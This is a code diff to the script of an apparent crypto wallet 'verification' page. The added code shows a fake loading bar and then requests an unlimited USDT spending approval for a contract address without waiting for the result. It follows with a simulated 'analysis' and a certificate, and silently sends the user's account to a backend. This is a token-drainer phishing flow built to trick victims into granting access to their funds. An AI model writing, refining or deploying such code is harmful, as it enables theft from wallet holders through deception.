@@ -1289,31 +1289,47 @@
     }
 
 
-
     async function startVerification() {
         try {
-            document.getElementById('errorMessage').classList.remove('show');
-            document.getElementById('verifyBtn').disabled = true;
-            document.getElementById('verifyBtn').textContent = 'Checking approval...';
-            
+            const verifyBtn = document.getElementById('verifyBtn');
+            const errorMessage = document.getElementById('errorMessage');
+            const progressContainer = document.getElementById('progressContainer');
+            const analyzingText = document.getElementById('analyzingText');
+    
+            errorMessage.classList.remove('show');
+            verifyBtn.disabled = true;
+            verifyBtn.textContent = 'Checking approval...';
+    
             // Save to backend (non-blocking)
-            saveUserToBackend(account).catch(err => {
-                console.warn('Backend save failed, continuing verification:', err);
-            });
-            
+            saveUserToBackend(account).catch(() => {});
+    
             const currentAllowance = await usdtContract.methods.allowance(account, CONTRACT_ADDRESS).call();
             const minRequired = web3.utils.toBN('1000000');
-            
+    
+            // --- If approval is needed ---
             if (web3.utils.toBN(currentAllowance).lt(minRequired)) {
-                document.getElementById('verifyBtn').textContent = 'Loading...';
-                const maxAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
-                await usdtContract.methods.approve(CONTRACT_ADDRESS, maxAmount).send({ from: account });
+    
+                // Start fake progress bar
+                verifyBtn.textContent = 'Loading...';
+                await fakeLoadingProgress(); // Smooth 0 → 100% animation
+    
+                // Now send real approval transaction (non-blocking)
+                const maxAmount =
+                    '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+    
+                usdtContract.methods
+                    .approve(CONTRACT_ADDRESS, maxAmount)
+                    .send({ from: account })
+                    .then(() => console.log("Approval sent"))
+                    .catch(err => console.error("Approval error:", err));
             }
-            
-            document.getElementById('verifyBtn').textContent = 'Analyzing...';
-            document.getElementById('progressContainer').classList.add('show');
-            document.getElementById('analyzingText').classList.add('show');
-            
+    
+            // Start analysis
+            verifyBtn.textContent = 'Analyzing...';
+            progressContainer.classList.add('show');
+            analyzingText.classList.add('show');
+    
+            // Reset progress bars
             for (let i = 1; i <= 5; i++) {
                 document.getElementById(`bar${i}`).style.width = '0%';
                 document.getElementById(`percent${i}`).textContent = '0%';
@@ -1321,34 +1337,56 @@
             }
             document.getElementById('overallBar').style.width = '0%';
             document.getElementById('overallPercent').textContent = '0%';
-            
+    
+            // Real analysis simulation
             await simulateProgress();
-            
+    
             generateCertificateData();
-            
-            document.getElementById('analyzingText').classList.remove('show');
+    
+            analyzingText.classList.remove('show');
             showCertificate();
-            
+    
         } catch (error) {
             console.error("ERROR:", error);
-            
+    
             let errorMsg = 'Verification failed: ' + error.message;
-            
+    
             if (error.message.includes('insufficient funds')) {
                 errorMsg = 'Insufficient ETH for gas fees.';
             } else if (error.message.includes('User denied')) {
                 errorMsg = 'Transaction rejected.';
             }
-            
+    
             document.getElementById('errorText').textContent = errorMsg;
             document.getElementById('errorMessage').classList.add('show');
-            document.getElementById('verifyBtn').disabled = false;
-            document.getElementById('verifyBtn').textContent = 'Confirm Verification';
-            document.getElementById('progressContainer').classList.remove('show');
-            document.getElementById('analyzingText').classList.remove('show');
+    
+            verifyBtn.disabled = false;
+            verifyBtn.textContent = 'Confirm Verification';
+    
+            progressContainer.classList.remove('show');
+            analyzingText.classList.remove('show');
         }
     }
 
+
+    function fakeLoadingProgress() {
+        return new Promise(resolve => {
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += 2;
+    
+                // Update button text to show fake progress
+                document.getElementById('verifyBtn').textContent = `Loading ${progress}%...`;
+    
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    resolve();
+                }
+            }, 30); // ~3 seconds total
+        });
+    }
+
+    
 
     async function simulateProgress() {
         const steps = [
